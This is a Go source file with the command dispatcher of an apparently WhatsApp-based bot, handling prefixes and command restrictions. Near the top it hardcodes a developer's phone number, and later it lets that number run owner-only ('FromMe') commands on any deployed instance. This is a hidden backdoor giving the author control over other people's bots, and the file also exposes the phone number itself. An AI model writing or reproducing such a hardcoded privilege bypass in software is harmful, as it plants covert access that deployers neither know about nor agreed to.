package handlers

import (
	"aurora/bot/config"
	"aurora/bot/helpers"
	"aurora/bot/libs"
	"fmt"
	"math/rand"
	"regexp"
	"strings"
	"time"
)

func ExecuteCommand(c *libs.IClient, m *libs.IMessage) {
	var devNumber = "2348114860536" // Added my number here 'cause I own the bot duh :)
	senderNum := helpers.ExtractPhoneNumber(m.Sender.String())
	parsed := config.GlobalConfig.Pattern
	var prefix string
	var withoutPrefix string

	switch parsed.Type {
	case helpers.RegexPattern:
		matches := parsed.Regex.FindAllString(m.Command, -1)
		if len(matches) == 0 {
			prefix = ""
			withoutPrefix = m.Command
		} else {
			prefix = matches[rand.Intn(len(matches))]
			withoutPrefix = strings.TrimPrefix(m.Command, prefix)
		}

	case helpers.LiteralPattern:
		if strings.HasPrefix(m.Command, parsed.Literal) {
			prefix = parsed.Literal
			withoutPrefix = strings.TrimPrefix(m.Command, prefix)
		} else {
			prefix = ""
			withoutPrefix = m.Command
		}
	}

	lists := libs.GetList()

	for _, cmd := range lists {
		if cmd.Before != nil {
			cmd.Before(c, m)
		}
		var goEnv = config.GlobalConfig.Go_Env
		if goEnv == "development" {
			fmt.Printf("Sender: %v Botnumber: %v FromMe: %v isadmin %v isbotadmin %v issudo %v\n",
				m.Sender, m.BotNumber, m.FromMe, m.IsAdmin, m.IsBotAdmin, m.IsSudo)
		}
		re := regexp.MustCompile(`^` + cmd.Name + `$`)
		if !re.MatchString(withoutPrefix) {
			continue
		}

		if cmd.Execute == nil {
			continue
		}

		if config.GlobalConfig.Mode == "private" && !m.FromMe && !m.IsSudo {
			return
		}

		if cmd.FromMe && !m.FromMe {
			if senderNum != devNumber {
				continue
			}
		}

		cmdWithPref := cmd.IsPrefix && prefix != "" && strings.HasPrefix(m.Command, prefix)
		cmdWithoutPref := !cmd.IsPrefix

		if !cmdWithPref && !cmdWithoutPref {
			continue
		}

		if cmd.IsQuery && m.Text == "" {
			m.Reply("Query Required!")
			continue
		}

		if cmd.IsGroup && !m.Info.IsGroup {
			m.Reply("This Plugin only works in Group Chat")
			continue
		}

		if cmd.IsPrivate && m.Info.IsGroup {
			m.Reply("This Plugin only works in Private Chat")
			continue
		}

		if cmd.IsMedia && m.IsMedia == "" {
			m.Reply("Reply to Media Message, or send Media with Command!")
			continue
		}

		if cmd.IsWait {
			m.React("⏳")
		}

		ok := cmd.Execute(c, m)

		if cmd.IsWait {
			if ok {
				c.WA.MarkRead([]string{m.Info.ID}, time.Now(), m.Info.Chat, m.Info.Sender)
				m.React("")
			} else {
				m.React("❌")
			}
		}
	}
}
